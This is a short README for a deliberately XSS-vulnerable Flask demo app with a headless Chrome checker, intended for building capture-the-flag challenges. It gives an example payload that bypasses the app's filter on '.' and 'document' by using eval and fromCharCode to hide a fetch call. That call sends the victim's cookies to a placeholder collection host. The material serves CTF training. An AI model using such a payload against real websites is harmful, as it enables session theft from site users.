## XSS demo app

This is a demo flask app vulnerable to XSS attack
with chrome headless checker. It may be useful in creation of CTF challenges.

In this application "." and "document" are filtered, so possible payload may be:
```
"><script>eval(String['fromCharCode'](102,101,116,...))</script>
where encoded in ascii query is something like:
fetch('https://our.domain.pipedream.net/?c=' + document['cookie'])
```

### Deployment
Guide for installation, configuration and running is available [here](DEPLOY.md)

### TODO
Plans for project improvement can be found [here](https://github.com/leshark/xss-ctf-challenge/projects/1) <br>
Issues and PR's are welcome!
